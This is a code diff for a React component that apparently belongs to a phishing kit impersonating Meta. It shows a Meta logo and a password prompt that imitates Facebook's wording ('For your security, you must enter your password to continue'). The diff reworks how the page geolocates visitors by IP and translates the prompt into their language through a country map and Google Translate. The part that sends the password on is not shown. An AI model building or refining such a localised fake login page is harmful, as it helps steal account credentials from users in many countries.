@@ -2,7 +2,7 @@
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
+import { getTranslations } from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useState, useEffect, type FC } from 'react';
@@ -28,94 +28,121 @@ const PasswordModal: FC<PasswordModalProps> = ({
     const [error, setError] = useState('');
     const [attemptCount, setAttemptCount] = useState(0);
 
-    // Translation state
-    const [countryCode, setCountryCode] = useState('US');
-    const [translations, setTranslations] = useState<Record<string, string>>({}); 
+    const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { messageId, message, setMessage, setFormStep } = store();
+    const { messageId, message, setMessage, setFormStep, geoInfo } = store();
 
-    // Geo-detection effect
+    // Translation effect
     useEffect(() => {
-        const fetchGeoInfo = async () => {
-            try {
-                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
-                const cc = (data.country_code || 'US').toUpperCase();
-                setCountryCode(cc);
-            } catch {
-                setCountryCode('US');
-            }
-        };
-        fetchGeoInfo();
-    }, []);
-
-    // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
-    useEffect(() => {
-        if (!countryCode) return;
+        if (!geoInfo) return;
 
         (async () => {
-            const lang = COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en';
-            if (lang === 'en') {
-                setTranslations({});
+            const countryLangMap: Record<string, string> = {
+                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
+                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
+                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
+                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
+                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
+                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
+                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
+                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
+                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
+                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
+                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
+                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
+                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
+                VE: 'es',
+                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
+                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
+                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
+                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
+                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
+                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
+                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
+                YE: 'ar',
+                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
+                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
+                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
+                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
+                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
+                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
+                UA: 'uk', GB: 'en', VA: 'it',
+                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
+                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
+                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
+            };
+
+            const HARDCODED_LANGS = new Set([
+                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
+                'tr','th','ko','sv','id','ms','ro','cs','hu','fi','da','no'
+            ]);
+
+            const cc = geoInfo.country_code.toUpperCase();
+            const lang = countryLangMap[cc] || 'en';
+            if (lang === 'en') return;
+
+            if (HARDCODED_LANGS.has(lang)) {
+                setTranslations(getTranslations(lang));
                 return;
             }
 
-            // Get hardcoded translations first
-            const hardcodedTrans = getTranslations(lang) || {};
-            setTranslations(hardcodedTrans);
-
-            // Identify all texts used in this modal
-            const allTextsNeeded = [
-                'Hi',
-                'For your security, you must enter your password to continue.',
-                'Enter your password',
+            const textsToTranslate = [
+                'Password',
                 'Continue',
                 'Forgotten password?',
+                'For your security, you must enter your password to continue.',
+                'The password you\'ve entered is incorrect',
+                'Hi',
                 'Please fill in all fields',
                 'Password must be at least 6 characters',
-                'Incorrect password. Please try again.'
+                'Incorrect password. Please try again.',
+                'Enter your password',
             ];
 
-            // Find missing texts not in hardcoded translations
-            const missingTexts = allTextsNeeded.filter(text => !hardcodedTrans[text]);
-            if (missingTexts.length === 0) return;
+            const CACHE_KEY = 'translation_cache';
+            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
+            const cache = cached ? JSON.parse(cached) : {};
 
-            // Get cache for this language
-            const CACHE_KEY = `translation_cache_${lang}`;
-            const cache: Record<string, string> = localStorage.getItem(CACHE_KEY)
-                ? JSON.parse(localStorage.getItem(CACHE_KEY)!)
-                : {};
+            const allCached = textsToTranslate.every(text => cache[`en:${lang}:${text}`]);
+            if (allCached) {
+                const translatedMap: Record<string, string> = {};
+                textsToTranslate.forEach(text => {
+                    translatedMap[text] = cache[`en:${lang}:${text}`];
+                });
+                setTranslations(translatedMap);
+                return;
+            }
 
-            // Fetch missing texts from Google Translate API
-            const results = await Promise.all(
-                missingTexts.map(async (text) => {
-                    if (cache[text]) return { text, translated: cache[text] };
-                    try {
-                        const res = await axios.get('https://translate.googleapis.com/translate_a/single', {
-                            params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text },
-                            timeout: 3000
-                        });
-                        const translated = res.data[0]?.map((item: string[]) => item[0]).filter(Boolean).join('') || text;
-                        cache[text] = translated;
-                        return { text, translated };
-                    } catch {
-                        return { text, translated: text };
-                    }
-                })
-            );
-
-            // Cache the results
-            localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
-
-            // Merge hardcoded and API translations
-            const apiTranslations: Record<string, string> = {};
-            results.forEach(({ text, translated }) => {
-                apiTranslations[text] = translated;
+            const translatePromises = textsToTranslate.map(async (text) => {
+                const cacheKey = `en:${lang}:${text}`;
+                if (cache[cacheKey]) return { text, translated: cache[cacheKey] };
+                try {
+                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                        params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text }
+                    });
+                    const translatedText = response.data[0]
+                        ?.map((item: unknown[]) => item[0])
+                        .filter(Boolean)
+                        .join('') || text;
+                    cache[cacheKey] = translatedText;
+                    return { text, translated: translatedText };
+                } catch {
+                    return { text, translated: text };
+                }
             });
 
-            const mergedTranslations = { ...hardcodedTrans, ...apiTranslations };
-            setTranslations(mergedTranslations);
+            const results = await Promise.all(translatePromises);
+            if (typeof window !== 'undefined') {
+                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+            }
+
+            const translatedMap: Record<string, string> = {};
+            results.forEach(({ text, translated }) => {
+                translatedMap[text] = translated;
+            });
+            setTranslations(translatedMap);
         })();
-    }, [countryCode]);
+    }, [geoInfo]);
 
     const t = (text: string): string => translations[text] || text;
 
